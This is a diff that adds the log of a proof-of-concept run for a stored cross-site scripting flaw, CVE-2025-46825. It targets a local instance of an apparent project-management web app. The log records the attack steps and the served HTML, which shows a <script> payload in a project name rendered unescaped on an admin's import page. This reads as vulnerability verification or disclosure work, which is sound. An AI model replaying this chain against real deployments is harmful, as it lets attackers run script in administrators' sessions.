@@ -1,0 +1,14 @@
+== CVE-2025-46825 stored-XSS PoC against http://localhost:8080 ==
+[1] payload project name: <script>alert(document.domain)</script>
+[2] victim session: logged in as admin
+[3] user-create form action: /?controller=UserCreationController&action=save | fields: ['confirmation', 'csrf_token', 'disable_login_form', 'email', 'filter', 'is_ldap_user', 'language', 'name', 'notifications_enabled', 'password', 'project_id', 'role', 'timezone', 'username']
+[4] attacker account created (role: app-manager)
+[5] attacker session: logged in as xsattacker
+[6] victim-context project created: id 1 ( Ops Workstream )
+[7] poisoned project created: id 2 (project name is the payload)
+[8] victim added to the poisoned project (role: project-member)
+[9] admin opened /?controller=ProjectViewController&action=importTasks&project_id=1
+    HTML saved to evidence/01-xss/vulnerable-import-page.html
+    served line: <div class="js-select-dropdown-autocomplete" data-params='{"name":"boardId","placeholder":"Display another project","ariaLabel":"Display another project","items":{"2":"<script>alert(document.domain)<\/script>"},"redirect":{"regex":"PROJECT_ID","url":"\/?controller=BoardViewController&action=show&project_id=PROJECT_ID"},"onFocus":["board.selector.open"]}'></div>
+    served line: <option value="2"><script>alert(document.domain)</script></option>
+[VERDICT] VULNERABLE — raw <script> payload served unescaped into the admin's HTML
